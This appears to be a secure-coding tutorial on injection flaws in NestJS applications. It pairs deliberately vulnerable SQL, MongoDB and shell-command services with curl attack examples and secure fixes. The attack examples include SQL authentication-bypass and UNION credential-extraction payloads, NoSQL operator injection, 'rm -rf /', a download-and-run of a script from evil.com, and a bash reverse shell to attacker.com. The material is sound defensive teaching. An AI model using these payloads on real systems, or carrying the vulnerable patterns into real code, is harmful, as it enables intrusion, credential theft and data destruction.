A05: Injection - Real Scenarios

Overview​

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

Key Concepts​

  • SQL Injection: Malicious SQL code in database queries
  • NoSQL Injection: Exploiting NoSQL database queries
  • Command Injection: Executing OS commands
  • LDAP Injection: Manipulating LDAP queries
  • Template Injection: Injecting malicious template code

Vulnerable Scenario 1: SQL Injection​

Vulnerable Code (NestJS with Raw SQL)​

// products.service.ts - VULNERABLE
import { Injectable } from '@nestjs/common';
import { InjectConnection } from '@nestjs/typeorm';
import { Connection } from 'typeorm';

@Injectable()
export class ProductsService {
  constructor(@InjectConnection() private connection: Connection) {}

  // ❌ VULNERABLE: SQL Injection via string concatenation
  async searchProducts(searchTerm: string) {
    const query = `
      SELECT * FROM products 
      WHERE name LIKE '%${searchTerm}%' 
      OR description LIKE '%${searchTerm}%'
    `;

    return await this.connection.query(query);
  }

  // ❌ VULNERABLE: Dynamic ORDER BY injection
  async getProductsSorted(sortBy: string, order: string) {
    const query = `
      SELECT * FROM products 
      ORDER BY ${sortBy} ${order}
    `;

    return await this.connection.query(query);
  }

  // ❌ VULNERABLE: Authentication bypass
  async login(email: string, password: string) {
    const query = `
      SELECT * FROM users 
      WHERE email = '${email}' 
      AND password = '${password}'
    `;

    const users = await this.connection.query(query);
    return users.length > 0 ? users[0] : null;
  }
}

Attack Examples​

# Attack 1: Extract all products
curl "https://api.example.com/products/search?q=' OR '1'='1"

# Resulting query:
# SELECT * FROM products
# WHERE name LIKE '%' OR '1'='1%'
# ❌ Returns ALL products, bypassing search logic

# Attack 2: SQL Injection to extract data
curl "https://api.example.com/products/search?q=' UNION SELECT id, email, password, NULL FROM users --"

# Resulting query:
# SELECT * FROM products
# WHERE name LIKE '%' UNION SELECT id, email, password, NULL FROM users --%'
# ❌ Exposes all user credentials!

# Attack 3: Authentication bypass
curl -X POST https://api.example.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@example.com", "password": "' OR '1'='1"}'

# Resulting query:
# SELECT * FROM users
# WHERE email = 'admin@example.com'
# AND password = '' OR '1'='1'
# ❌ Bypasses authentication! Always returns true

# Attack 4: Blind SQL Injection for enumeration
curl "https://api.example.com/products?sort=name&order=ASC; DROP TABLE products--"

# Resulting query:
# SELECT * FROM products ORDER BY name ASC; DROP TABLE products--
# ❌ Could delete entire table!

Secure Solution​

// products.service.ts - SECURE
import { Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository, Like } from 'typeorm';
import { Product } from './entities/product.entity';
import { User } from '../users/entities/user.entity';
import * as bcrypt from 'bcrypt';

@Injectable()
export class ProductsService {
  constructor(
    @InjectRepository(Product)
    private productRepository: Repository<Product>,
    @InjectRepository(User)
    private userRepository: Repository<User>,
  ) {}

  // ✅ SECURE: Using ORM with parameterized queries
  async searchProducts(searchTerm: string) {
    // ✅ Input validation
    if (!searchTerm || searchTerm.length > 100) {
      throw new BadRequestException('Invalid search term');
    }

    // ✅ ORM automatically escapes parameters
    return await this.productRepository.find({
      where: [{ name: Like(`%${searchTerm}%`) }, { description: Like(`%${searchTerm}%`) }],
    });
  }

  // ✅ SECURE: Whitelist allowed sort columns
  async getProductsSorted(sortBy: string, order: string) {
    // ✅ Whitelist validation
    const allowedSortColumns = ['name', 'price', 'createdAt', 'rating'];
    const allowedOrders = ['ASC', 'DESC'];

    if (!allowedSortColumns.includes(sortBy)) {
      throw new BadRequestException('Invalid sort column');
    }

    if (!allowedOrders.includes(order.toUpperCase())) {
      throw new BadRequestException('Invalid sort order');
    }

    // ✅ Safe to use validated inputs
    return await this.productRepository.find({
      order: {
        [sortBy]: order.toUpperCase() as 'ASC' | 'DESC',
      },
    });
  }

  // ✅ SECURE: Proper authentication with hashing
  async login(email: string, password: string) {
    // ✅ Input validation
    if (!email || !password) {
      throw new BadRequestException('Email and password required');
    }

    // ✅ Find user with parameterized query
    const user = await this.userRepository.findOne({
      where: { email },
      select: ['id', 'email', 'password', 'isActive'],
    });

    if (!user || !user.isActive) {
      // ✅ Constant-time response to prevent timing attacks
      await bcrypt.hash(password, 10);
      throw new UnauthorizedException('Invalid credentials');
    }

    // ✅ Compare hashed password
    const isValid = await bcrypt.compare(password, user.password);

    if (!isValid) {
      throw new UnauthorizedException('Invalid credentials');
    }

    // Remove sensitive data
    delete user.password;
    return user;
  }
}

Using Query Builder Safely​

// ✅ SECURE: TypeORM Query Builder with parameters
async advancedSearch(filters: SearchFilters) {
  const query = this.productRepository
    .createQueryBuilder('product')
    .leftJoinAndSelect('product.category', 'category');

  // ✅ Use parameters, not string concatenation
  if (filters.name) {
    query.andWhere('product.name LIKE :name', {
      name: `%${filters.name}%`
    });
  }

  if (filters.minPrice) {
    query.andWhere('product.price >= :minPrice', {
      minPrice: filters.minPrice
    });
  }

  if (filters.categoryId) {
    query.andWhere('category.id = :categoryId', {
      categoryId: filters.categoryId
    });
  }

  // ✅ Validated sort field
  const allowedSortFields = ['name', 'price', 'createdAt'];
  const sortField = allowedSortFields.includes(filters.sortBy)
    ? filters.sortBy
    : 'createdAt';

  query.orderBy(`product.${sortField}`, 'DESC');

  return await query.getMany();
}

Vulnerable Scenario 2: NoSQL Injection (MongoDB)​

Vulnerable Code (NestJS with Mongoose)​

// auth.service.ts - VULNERABLE
import { Injectable } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { User } from './schemas/user.schema';

@Injectable()
export class AuthService {
  constructor(@InjectModel(User.name) private userModel: Model<User>) {}

  // ❌ VULNERABLE: NoSQL Injection
  async login(credentials: any) {
    // ❌ Directly using user input in query
    const user = await this.userModel.findOne({
      email: credentials.email,
      password: credentials.password,
    });

    return user ? this.generateToken(user) : null;
  }

  // ❌ VULNERABLE: Operator injection
  async findUsers(filter: any) {
    return await this.userModel.find(filter);
  }
}

Attack Examples​

# Attack 1: Authentication bypass using $ne operator
curl -X POST https://api.example.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$ne": null},
    "password": {"$ne": null}
  }'

# Resulting MongoDB query:
# db.users.findOne({ email: {$ne: null}, password: {$ne: null} })
# ❌ Returns first user where email and password are not null!

# Attack 2: Extract data using $regex
curl -X POST https://api.example.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$regex": "^admin"},
    "password": {"$regex": ".*"}
  }'

# Attack 3: Timing attack to enumerate passwords
curl -X POST https://api.example.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@example.com",
    "password": {"$regex": "^a.*"}
  }'
# If this takes longer, password starts with 'a'

# Attack 4: JavaScript injection (if eval is used)
curl "https://api.example.com/users?filter[$where]=this.password.length > 0"
# ❌ Could execute arbitrary JavaScript

Secure Solution​

// auth.service.ts - SECURE
import { Injectable } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { User } from './schemas/user.schema';
import * as bcrypt from 'bcrypt';

@Injectable()
export class AuthService {
  constructor(@InjectModel(User.name) private userModel: Model<User>) {}

  // ✅ SECURE: Type validation and safe query construction
  async login(email: string, password: string) {
    // ✅ Validate input types
    if (typeof email !== 'string' || typeof password !== 'string') {
      throw new BadRequestException('Invalid credentials format');
    }

    // ✅ Sanitize input
    const sanitizedEmail = email.trim().toLowerCase();

    // ✅ Use typed parameters, not object spread
    const user = await this.userModel
      .findOne({ email: sanitizedEmail })
      .select('+password') // Explicitly select password field
      .exec();

    if (!user) {
      // Constant-time response
      await bcrypt.hash(password, 10);
      throw new UnauthorizedException('Invalid credentials');
    }

    // ✅ Compare hashed password
    const isValid = await bcrypt.compare(password, user.password);

    if (!isValid) {
      throw new UnauthorizedException('Invalid credentials');
    }

    return this.generateToken(user);
  }

  // ✅ SECURE: Explicit query building with validation
  async findUsers(filters: UserSearchFilters) {
    const query: any = {};

    // ✅ Validate and sanitize each field
    if (filters.email && typeof filters.email === 'string') {
      query.email = filters.email.trim().toLowerCase();
    }

    if (filters.isActive !== undefined && typeof filters.isActive === 'boolean') {
      query.isActive = filters.isActive;
    }

    if (filters.role && typeof filters.role === 'string') {
      const allowedRoles = ['user', 'admin', 'moderator'];
      if (allowedRoles.includes(filters.role)) {
        query.role = filters.role;
      }
    }

    // ✅ Never allow query operators from user input
    return await this.userModel
      .find(query)
      .select('-password') // Exclude password
      .limit(100)
      .exec();
  }
}

Input Sanitization Middleware​

// sanitize-input.middleware.ts
import { Injectable, NestMiddleware, BadRequestException } from '@nestjs/common';
import { Request, Response, NextFunction } from 'express';

@Injectable()
export class SanitizeInputMiddleware implements NestMiddleware {
  use(req: Request, res: Response, next: NextFunction) {
    // ✅ Recursively remove MongoDB operators
    req.body = this.sanitize(req.body);
    req.query = this.sanitize(req.query);
    req.params = this.sanitize(req.params);

    next();
  }

  private sanitize(obj: any): any {
    if (obj instanceof Object) {
      for (const key in obj) {
        // ✅ Remove keys starting with $ or containing .
        if (key.startsWith('$') || key.includes('.')) {
          delete obj[key];
        } else {
          obj[key] = this.sanitize(obj[key]);
        }
      }
    }
    return obj;
  }
}

// Apply middleware in main.ts
app.use(new SanitizeInputMiddleware().use);

Vulnerable Scenario 3: Command Injection​

Vulnerable Code (Node.js)​

// file-processor.service.ts - VULNERABLE
import { Injectable } from '@nestjs/common';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

@Injectable()
export class FileProcessorService {
  // ❌ VULNERABLE: Command injection via filename
  async convertImage(filename: string, format: string) {
    // ❌ User input directly in shell command
    const command = `convert ${filename} output.${format}`;

    try {
      const { stdout } = await execAsync(command);
      return { success: true, output: stdout };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ❌ VULNERABLE: Command injection in PDF generation
  async generatePdf(htmlFile: string, outputName: string) {
    const command = `wkhtmltopdf ${htmlFile} ${outputName}.pdf`;
    await execAsync(command);
  }

  // ❌ VULNERABLE: Ping command injection
  async pingHost(hostname: string) {
    const command = `ping -c 4 ${hostname}`;
    const { stdout } = await execAsync(command);
    return stdout;
  }
}

Attack Examples​

# Attack 1: Execute arbitrary commands via semicolon
curl -X POST https://api.example.com/convert \
  -d 'filename=image.jpg; cat /etc/passwd'

# Resulting command:
# convert image.jpg; cat /etc/passwd output.png
# ❌ Executes: convert image.jpg (then) cat /etc/passwd

# Attack 2: Chain commands with &&
curl -X POST https://api.example.com/convert \
  -d 'filename=image.jpg && rm -rf /'

# Attack 3: Background process with &
curl -X POST https://api.example.com/convert \
  -d 'filename=image.jpg & wget http://evil.com/malware.sh -O /tmp/m.sh && sh /tmp/m.sh &'

# Attack 4: Command substitution
curl -X POST https://api.example.com/ping \
  -d 'hostname=example.com `whoami`'

# Or using $()
curl -X POST https://api.example.com/ping \
  -d 'hostname=$(cat /etc/passwd)'

# Attack 5: Reverse shell
curl -X POST https://api.example.com/convert \
  -d 'filename=x.jpg; bash -i >& /dev/tcp/attacker.com/4444 0>&1'
# ❌ Opens reverse shell to attacker!

Secure Solution​

// file-processor.service.ts - SECURE
import { Injectable, BadRequestException } from '@nestjs/common';
import { spawn } from 'child_process';
import * as path from 'path';
import * as fs from 'fs/promises';

@Injectable()
export class FileProcessorService {
  private readonly UPLOAD_DIR = '/var/app/uploads';
  private readonly OUTPUT_DIR = '/var/app/outputs';

  // ✅ SECURE: Use spawn with array arguments (no shell interpretation)
  async convertImage(filename: string, format: string) {
    // ✅ Validate filename - whitelist approach
    if (!this.isValidFilename(filename)) {
      throw new BadRequestException('Invalid filename');
    }

    // ✅ Validate format - whitelist
    const allowedFormats = ['png', 'jpg', 'jpeg', 'webp', 'gif'];
    if (!allowedFormats.includes(format.toLowerCase())) {
      throw new BadRequestException('Invalid format');
    }

    // ✅ Use absolute paths
    const inputPath = path.join(this.UPLOAD_DIR, path.basename(filename));
    const outputPath = path.join(this.OUTPUT_DIR, `${Date.now()}.${format}`);

    // ✅ Verify file exists
    try {
      await fs.access(inputPath);
    } catch {
      throw new BadRequestException('File not found');
    }

    // ✅ Use spawn with argument array (no shell)
    return new Promise((resolve, reject) => {
      const process = spawn('convert', [inputPath, outputPath], {
        shell: false, // ✅ Critical: disable shell interpretation
        timeout: 30000, // ✅ Timeout to prevent DOS
      });

      let stdout = '';
      let stderr = '';

      process.stdout.on('data', (data) => (stdout += data));
      process.stderr.on('data', (data) => (stderr += data));

      process.on('close', (code) => {
        if (code === 0) {
          resolve({ success: true, outputPath });
        } else {
          reject(new Error(`Conversion failed: ${stderr}`));
        }
      });

      process.on('error', (error) => {
        reject(error);
      });
    });
  }

  // ✅ SECURE: Ping with validation
  async pingHost(hostname: string) {
    // ✅ Strict validation - only allow valid hostnames/IPs
    if (!this.isValidHostname(hostname)) {
      throw new BadRequestException('Invalid hostname');
    }

    // ✅ Use spawn with arguments array
    return new Promise((resolve, reject) => {
      const process = spawn('ping', ['-c', '4', hostname], {
        shell: false,
        timeout: 10000,
      });

      let output = '';
      process.stdout.on('data', (data) => (output += data));

      process.on('close', (code) => {
        resolve({ success: code === 0, output });
      });

      process.on('error', (error) => {
        reject(error);
      });
    });
  }

  // ✅ Validation helpers
  private isValidFilename(filename: string): boolean {
    // Only alphanumeric, dash, underscore, and dot
    const filenameRegex = /^[a-zA-Z0-9_-]+\.[a-zA-Z0-9]+$/;

    // Check for path traversal attempts
    if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
      return false;
    }

    return filenameRegex.test(filename);
  }

  private isValidHostname(hostname: string): boolean {
    // Valid hostname regex
    const hostnameRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?(\.[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?)*$/;

    // Valid IP address regex
    const ipRegex = /^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$/;

    // No special characters that could be used for injection
    if (/[;&|`$()]/.test(hostname)) {
      return false;
    }

    return hostnameRegex.test(hostname) || ipRegex.test(hostname);
  }
}

Safer Alternative - Use Libraries​

// ✅ BEST: Use specialized libraries instead of shell commands
import * as sharp from 'sharp'; // For image processing
import * as ping from 'ping'; // For network ping

@Injectable()
export class FileProcessorService {
  // ✅ Use sharp library instead of ImageMagick
  async convertImage(inputPath: string, format: string) {
    const allowedFormats = ['png', 'jpg', 'jpeg', 'webp'];
    if (!allowedFormats.includes(format)) {
      throw new BadRequestException('Invalid format');
    }

    const outputPath = path.join(this.OUTPUT_DIR, `${Date.now()}.${format}`);

    await sharp(inputPath)
      .toFormat(format as any)
      .toFile(outputPath);

    return { outputPath };
  }

  // ✅ Use ping library
  async pingHost(hostname: string) {
    if (!this.isValidHostname(hostname)) {
      throw new BadRequestException('Invalid hostname');
    }

    const result = await ping.promise.probe(hostname, {
      timeout: 10,
      extra: ['-c', '4'],
    });

    return {
      alive: result.alive,
      time: result.time,
      output: result.output,
    };
  }
}

Prevention Checklist​

  • Use ORMs: Prefer TypeORM, Prisma, Mongoose over raw queries
  • Parameterized queries: Always use placeholders for user input
  • Input validation: Whitelist allowed values
  • Escape special characters: When raw queries are necessary
  • Least privilege: Database users should have minimal permissions
  • Avoid shell commands: Use libraries instead of exec()
  • Type checking: Validate input types in NoSQL
  • Disable dangerous features: No eval(), Function(), or $where
  • Query timeouts: Prevent DOS attacks
  • Error handling: Don't expose query details in errors
